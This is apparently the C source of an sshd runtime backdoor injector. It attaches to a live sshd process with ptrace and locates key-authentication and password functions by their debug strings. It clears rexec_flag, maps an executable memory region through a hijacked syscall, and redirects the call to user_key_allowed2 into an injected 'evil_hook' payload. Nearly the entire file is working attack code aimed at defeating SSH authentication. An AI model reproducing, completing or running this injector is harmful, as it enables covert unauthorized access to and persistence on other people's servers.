#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <ctype.h>
#include <elf.h>
#include <link.h>

#define SC_SIG	"\x0f\x05"
#define MAX_MAPPING 255

#define MEM_R	1
#define MEM_W	2
#define MEM_X	4
#define MEM_P	8

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;
typedef u64 addr_t;

extern u8 *evil_hook;
extern u64 evil_hook_size;

u8 *dynsym, *dynstr;
int dynsym_sz, dynstr_sz;

typedef struct {
	u64 placeholder;
	char *name;
	char *str;
	char *sig;
	int  sig_len;
	int  shift_offs;
	u64  addr;
} signature;

typedef struct {
	u64 start;
	u64 end;
	u64 size;
	int perm;
	u8 *data;
} mem_mapping;

typedef struct {
	pid_t pid;
	u64 sc_addr;
	u64 elf_base;
	mem_mapping **mappings;
	int num_maps;
} inject_ctx;

signature signatures[]={
	{ 0x7777777788888888, "key_allowed", "trying public key file %s", "\x90", 1, 1, 0 },
	{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , "\x55", 1, 0, 0 },
	{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", "\x41\x57", 2, 0, 0 },
	{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , "\x00\x00\x00\x00\x48\x89", 6, 4, 0 },
	{ 0x5555555566666666, "key_free"   , "key_free: "               , "\x90", 1, 1, 0 },
	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , "\x90", 1, 1, 0 },
	{ 0x3333333344444444, "uauth_passwd", "password change not supported", "\x90\x90", 2, 2, 0 }
};

mem_mapping *mappings[MAX_MAPPING];
int do_trace=0;

void error( const char* format, ... ) {
	va_list args;
	printf("\x1b[31m[\x1b[1m!\x1b[0m\x1b[31m]\x1b[0m \x1b[31m\x1b[1mERROR: \x1b[0m\x1b[31m");
	va_start( args, format );
	vfprintf(stdout, format, args);
	va_end(args);
	printf("\x1b[0m\n");

	// every error is very critical
	exit(-1);
}

void info( const char* format, ... ) {
	va_list args;
	printf("\x1b[36m[\x1b[1m+\x1b[0m\x1b[36m]\x1b[0m ");
	printf("\x1b[37m\x1b[1m");
	va_start( args, format );
	vfprintf(stdout, format, args);
	va_end(args);
	printf("\x1b[0m\n");
	//usleep(100000);
}

void info2( const char* format, ... ) {
	va_list args;
	//printf("\x1b[33m[\x1b[1m+\x1b[0m\x1b[33m]\x1b[0m ");
	//printf("\x1b[32m\x1b[1m");
	printf("\x1b[33m \x1b[1m|_\x1b[0m\x1b[33m\x1b[0m ");
	printf("\x1b[32m\x1b[1m");
	va_start( args, format );
	vfprintf(stdout, format, args);
	va_end(args);
	printf("\x1b[0m\n");
}

void hexdump(void *ptr, int buflen) {
	unsigned char *buf = (unsigned char*)ptr;
	int i, j;
	for (i=0; i<buflen; i+=16) {
		printf("%06x: ", i);
		for (j=0; j<16; j++) 
			if (i+j < buflen)
				printf("%02x ", buf[i+j]);
			else
				printf("   ");
		printf(" ");
		for (j=0; j<16; j++) 
			if (i+j < buflen)
				printf("%c", isprint(buf[i+j]) ? buf[i+j] : '.');
		printf("\n");
	}
}

void _attach(int pid) {
	if((ptrace(PTRACE_ATTACH , pid , NULL , NULL)) < 0) {
		perror("ptrace_attach");
		exit(-1);
	}

	waitpid(pid , NULL , WUNTRACED);
}

void _detach(int pid) {
	if(ptrace(PTRACE_DETACH, pid , NULL , NULL) < 0) {
		perror("ptrace_detach");
		exit(-1);
	}
}

void _peek(int pid, unsigned long addr, void *ptr, int len) {
	long word;
	int count=0;

	if (do_trace==1) printf("PEEK(addr:%lX, out:%p, len:%d) = ", addr, ptr, len);

	while(len > 0) {
		word = ptrace(PTRACE_PEEKTEXT, pid, addr+count, NULL);
		if (do_trace==1) printf("%lX ", word);
		memcpy((u8*)(ptr + count), &word, (len < 8) ? len : 8);
		len -= 8;
		count += 8;
	}

	if (do_trace==1) printf("\n");
}

void _peek_file(FILE *f, unsigned long addr, void *ptr, int len) {
	fseek(f, addr, SEEK_SET);
	fread(ptr, len, 1, f);
}

void _poke(int pid, unsigned long addr, void *vptr,int len) {
       	int count;
       	long word;
	u8 *w8=(u8*)&word;

	count = 0;
	if (do_trace==1) printf("POKE(addr:%lX, buf:%p, len:%d);\n", addr, vptr, len);

	while (len > 0) {
		if (len >= 8) {
			memcpy(&word, vptr+count, 8);
		} else {
			_peek(pid, addr+(8-len), w8+(8-len), len);
			memcpy(w8, vptr+count, len);
		}

		word = ptrace(PTRACE_POKETEXT, pid, addr+count, word);
		len -= 8;
		count += 8;
	}
}

int _mmap(inject_ctx *ctx, void *addr, size_t len, int prot, int flags, int fd, off_t offset) {
	struct user_regs_struct regs_bak, *regs;
	unsigned long maddr;
	int i;

	regs = malloc(sizeof(struct user_regs_struct));

	if (ptrace(PTRACE_GETREGS, ctx->pid, NULL, &regs_bak) < 0) {
		perror("ptrace");
		exit(-1);
	}

	memcpy(regs, &regs_bak, sizeof(struct user_regs_struct));

	regs->rip = ctx->sc_addr;
	regs->rax = 0x09; // __nr_mmap 
	regs->rdi = (unsigned long)addr;
	regs->rsi = len;
	regs->rdx = prot;
	regs->r10 = flags;
	regs->r9  = fd;
	regs->r8  = offset;

	if (ptrace(PTRACE_SETREGS, ctx->pid, NULL, regs) < 0) {
		perror("ptrace");
		exit(-1);
	}

	maddr = ctx->sc_addr;

	if (ptrace(PTRACE_SINGLESTEP, ctx->pid, NULL, NULL) < 0)
		printf("ss phail!\n");

	if (waitpid(ctx->pid, &i, 0) < 0)
		perror("waitpid");

	ptrace(PTRACE_SETREGS, ctx->pid, NULL, &regs_bak);

	maddr = regs->rax;

	free(regs);

	return maddr;
}



int get_section(char *fn, char *sect, unsigned char **ret) {
	Elf64_Ehdr	*ehdr = malloc(sizeof(Elf64_Ehdr));
	Elf64_Shdr	*shdr = malloc(sizeof(Elf64_Shdr));
	unsigned char *str;
	FILE *f;
	int i;

	f=fopen(fn,"rb");

	// read elf64 hdr
	_peek_file(f, 0, ehdr, sizeof(Elf64_Ehdr));
	// read sh str table header
	_peek_file(f, ehdr->e_shoff + (ehdr->e_shstrndx * sizeof(Elf64_Shdr)), shdr, sizeof(Elf64_Shdr));
	// read sh str table
	str = malloc(shdr->sh_size);
	_peek_file(f, shdr->sh_offset, str, shdr->sh_size);
	for(i = 0; i < ehdr->e_shnum; i++) {
		_peek_file(f, ehdr->e_shoff + (i * sizeof(Elf64_Shdr)), shdr, sizeof(Elf64_Shdr));
		if (strcmp((char*)str+shdr->sh_name, sect) == 0) {
			*ret = malloc(shdr->sh_size);
			_peek_file(f, shdr->sh_offset, *ret, shdr->sh_size);
			break;
		}
	}

	fclose(f);

	return shdr->sh_size; 
}

u64 find_sig(u8 *b, int maxlen, u8 *sig, int siglen) {
	int i;

	for(i = 0; i < maxlen; i++) {
		if (memcmp(b+i, sig, siglen) == 0)
			return i;
	}

	return 0;
}

void map_init() {
	memset(mappings, 0, sizeof(mem_mapping*) * MAX_MAPPING);
}

void map_print(inject_ctx *ctx) {
	int i, last_end = 0;
	mem_mapping *m;	

	for(i = 0; i < ctx->num_maps; i++) {
		m = ctx->mappings[i];

		if (last_end == 0)
			info2("[%016lX -> %016lx]", m->start, m->end);
		else
			info2("[%016lX -> %016lx] <hole size:%d>", m->start, m->end, m->start-last_end);
	
		last_end = m->end;
	}	
}

void map_load(inject_ctx *ctx, mem_mapping *out, char *line) {
	u64 a_start, a_end;
	char m[4];
	sscanf(line, "%lx-%lx %c%c%c%c", &a_start, &a_end, &m[0],&m[1],&m[2],&m[3]);

	out->start = a_start;
	out->end   = a_end;
	out->size  = a_end-a_start;
	out->data  = malloc(out->size);
	out->perm  = 0;

	if (m[0] == 'r') out->perm |= MEM_R;
	if (m[1] == 'w') out->perm |= MEM_W;
	if (m[2] == 'x') out->perm |= MEM_X;
	if (m[3] == 'p') out->perm |= MEM_P;

	if (out->perm & MEM_R)
		_peek(ctx->pid, a_start, out->data, out->size);
	else
		memset(out->data, 0, out->size);
}

int map_load_all(inject_ctx *ctx) {
	int i = 0;
	char fn[255], line[256];
	FILE *f;

	sprintf(fn, "/proc/%d/maps", ctx->pid);
	f = fopen(fn, "rb");

	while (fgets(line, 255, f) != NULL) {
		mappings[i] = malloc(sizeof(mem_mapping));
		map_load(ctx, mappings[i], line);

		if ((mappings[i]->perm & MEM_X) && strstr(line, "sshd") != NULL) {
			info("found sshd ELF base @ 0x%lx", mappings[i]->start);
			ctx->elf_base = mappings[i]->start;
		}

		i++;
	}

	fclose(f);

	return i;
}

u64 find_sig_mem(inject_ctx *ctx, u8 *sig, int siglen, int perm_mask) {
	unsigned long a;
	mem_mapping *mapping;
	int i;

	for(i = 0; i < ctx->num_maps; i++) {
		mapping = ctx->mappings[i];

		if ((mapping->perm & perm_mask) != perm_mask)
			continue;

		a = find_sig(mapping->data, mapping->size, sig, siglen);

		if (a != 0)
			return mapping->start + a;
	}

	return 0;
}

u64 find_call(inject_ctx *ctx, u64 addr) {
	int i,j;
	char call_pat[]="\xe8\x00\x00\x00\x00";
	int *rptr = (int*)&call_pat[1];
	mem_mapping *mapping;
	u64 call_addr = 0;

	for(i = 0; i < ctx->num_maps; i++) {
		mapping = ctx->mappings[i];

		// skip non exec mappingz
		if (!(mapping->perm & MEM_X))
			continue;

		for(j = 0; j < mapping->size-5; j++) {
			*rptr = addr - (mapping->start+j+5);
			if (memcmp(mapping->data+j, call_pat, 5) == 0) {
				if (call_addr != 0) info("OMFG DUPE HIT");
				call_addr = mapping->start+j;
			}
		}
	}

	if (call_addr == 0)
		error("could NOT find call insn for addr 0x%llx", addr);

	return call_addr;
}

u64 sub_by_debugstr(inject_ctx *ctx, char *str, char *backstr, int backlen) {
	char bbuf[0x1000];
	char rdibuf[]="\x48\x8d\x3d\x00\x00\x00\x00";
	int *rptr= (int*)&rdibuf[3];
	u64 str_addr, lea_addr = 0;
	int i, j;
	mem_mapping *mapping;

	str_addr = find_sig_mem(ctx, (u8*)str, strlen(str), MEM_R);

	if (str_addr == 0)
		error("could not locate str '%s'", str);

	for(i = 1; i < ctx->num_maps; i++) {
		mapping = ctx->mappings[i];

		if ((mapping->perm & (MEM_R | MEM_X)) != (MEM_R | MEM_X))
			continue;

		for(j = 0; j < mapping->size-7; j++) {
			*rptr = str_addr - (mapping->start+j+7);
			if (memcmp(mapping->data+j, rdibuf, 7) == 0) {
				lea_addr = mapping->start+j;
			}
		}
	}

	if (lea_addr == 0) 
		error("could not find 'lea' insn for str '%s'", str);

	_peek(ctx->pid, lea_addr-0x1000, bbuf, 0x1000);
	for(j=0x1000-backlen; j>=0; j--) {
		if (memcmp(bbuf+j, backstr, backlen) == 0) // 
			return lea_addr-(0x1000-j);
	}

	return 0;
}

void swap_map(mem_mapping *m1, mem_mapping *m2) {
	mem_mapping tmp;

	memcpy(&tmp, m1, sizeof(mem_mapping));
	memcpy(m1, m2,   sizeof(mem_mapping));
	memcpy(m2, &tmp, sizeof(mem_mapping));
}

void sort_maps(inject_ctx *ctx) {
	int i, j;
	mem_mapping *m1,*m2;

	// sleazy bubblesort, who cares with this many entries
	for(j = 0; j < ctx->num_maps; j++) { 
		for(i = 0; i < ctx->num_maps-1; i++) {
			m1 = ctx->mappings[i];
			m2 = ctx->mappings[i+1];

			if (m1->start > m2->start) {
				swap_map(m1, m2);
			}
		}
	}
}

addr_t resolve_symbol(u8 *tab, int tab_size, char *str, char *sym) {
	int i;
	Elf64_Sym *s = (Elf64_Sym*)tab;

	for(i=0; i < (tab_size/sizeof(Elf64_Sym)); i++) {
		if (strcmp(str+s->st_name, sym) == 0)
			return s->st_value;

		s++;
	}

	return 0;
}

int main(int argc, char *argv[]) {
	char line[255];
	u8 *evil_bin;
	u64 diff=0, call_user_key_allowed2=0, hole_addr=0, rexec_flag;
	int i, j;
	mem_mapping *m1, *m2;
	unsigned int nullw=0;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
		return -1;
	}

	inject_ctx *ctx = malloc(sizeof(inject_ctx));

	ctx->pid     = atoi(argv[1]);

	_attach(ctx->pid);
	info("slurping stuff to memory..");
	map_init();
	ctx->num_maps = map_load_all(ctx);
	info("loaded %d memory mappings", ctx->num_maps);

	evil_bin = malloc(evil_hook_size);
	memcpy(evil_bin, evil_hook, evil_hook_size);

	ctx->mappings = mappings;

	sort_maps(ctx);
	//map_print(ctx);

	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
	info("syscall\t\t= \x1b[37m0x%lX", ctx->sc_addr);

	dynsym_sz = get_section("/usr/sbin/sshd", ".dynsym", &dynsym);
	dynstr_sz = get_section("/usr/sbin/sshd", ".dynstr", &dynstr);

	rexec_flag = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "rexec_flag");
	info("rexec_flag = 0x%lx", rexec_flag); 
	_poke(ctx->pid, rexec_flag, &nullw, 4);
	info("UPDATED!!!");

	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str, signatures[i].sig, signatures[i].sig_len);
		if (signatures[i].addr == 0) {
			error("%s not found :(\n", signatures[i].name);
		}

		signatures[i].addr += signatures[i].shift_offs;
		sprintf(line, "%s\t\t= \x1b[37m0x%lX", signatures[i].name, signatures[i].addr);

		for(j = 0; j < evil_hook_size - 8; j++) {
			u64 *vptr = (u64*)&evil_bin[j];
			if (*vptr == signatures[i].placeholder) {
				sprintf(line+strlen(line), " .. [%lX] at offset %x in evil_bin!", signatures[i].placeholder, j);
				*vptr = signatures[i].addr;
				break;
			}
		}
		info(line);
	}

	// find call to user_key_allowed2
	call_user_key_allowed2 = find_call(ctx, signatures[0].addr);
	info("call allowed2\t= \x1b[37m0x%lX", call_user_key_allowed2);
	
	// find a neighborly memoryhole where we can mmap
	for(i=0; i < ctx->num_maps; i++) {
		m1 = ctx->mappings[i];
		m2 = ctx->mappings[i+1];

		if(
			call_user_key_allowed2 >= m1->start && // call_user_key_allowed2 <= m1->end &&
			m2->start > (m1->end + 0x1000)
		) {
			hole_addr = m1->end;

			break;
		}
	}
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lX", hole_addr);

	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	info("mmap done.");

	diff = 0x100000000-(call_user_key_allowed2-hole_addr)-5;

	info(
		"building a bridge [0x%lX->0x%lX] .. opcode = [E8 %02X %02X %02X %02X]",
		call_user_key_allowed2, hole_addr,
		diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
	);

	_poke(ctx->pid, call_user_key_allowed2+1, &diff, 4);
	info("updated call. oh-oh");

	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
	_poke(ctx->pid, hole_addr+(evil_hook_size), argv[2], strlen(argv[2]));
	info("poked evil_bin to 0x%lX.", hole_addr);

	_detach(ctx->pid);
	info("detached.\n");
	free(ctx);
	return 0;
}
